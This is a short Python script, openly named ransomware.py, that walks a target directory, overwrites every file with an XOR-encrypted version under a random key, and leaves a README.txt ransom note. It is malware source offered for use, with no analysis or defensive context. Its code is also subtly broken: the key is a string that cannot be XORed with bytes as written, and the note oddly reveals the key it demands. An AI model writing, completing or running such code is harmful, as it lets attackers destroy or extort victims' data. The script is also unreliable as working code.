import os
import sys
import time
import random
import string
import zipfile
import shutil
import subprocess

def encrypt_file(file_name, key):
   with open(file_name, "rb") as f:
       data = f.read()

   encrypted_data = encrypt(data, key)

   with open(file_name, "wb") as f:
       f.write(encrypted_data)

def encrypt(data, key):
   encrypted_data = b""
   for i in range(len(data)):
       encrypted_data += bytes([data[i] ^ key[i % len(key)]])
   return encrypted_data

def decrypt_file(file_name, key):
   with open(file_name, "rb") as f:
       data = f.read()

   decrypted_data = decrypt(data, key)

   with open(file_name, "wb") as f:
       f.write(decrypted_data)

def decrypt(data, key):
   decrypted_data = b""
   for i in range(len(data)):
       decrypted_data += bytes([data[i] ^ key[i % len(key)]])
   return decrypted_data

def generate_key():
   key = ""
   for i in range(16):
       key += random.choice(string.ascii_letters + string.digits)
   return key

def main():
   if len(sys.argv) != 2:
       print("Usage: python ransomware.py <directory>")
       sys.exit(1)

   directory = sys.argv[1]

   key = generate_key()

   for root, dirs, files in os.walk(directory):
       for file in files:
           file_name = os.path.join(root, file)
           encrypt_file(file_name, key)

   with open("README.txt", "w") as f:
       f.write("Your files have been encrypted. To decrypt them, send us the following key: {}\n".format(key))

if __name__ == "__main__":
   main()
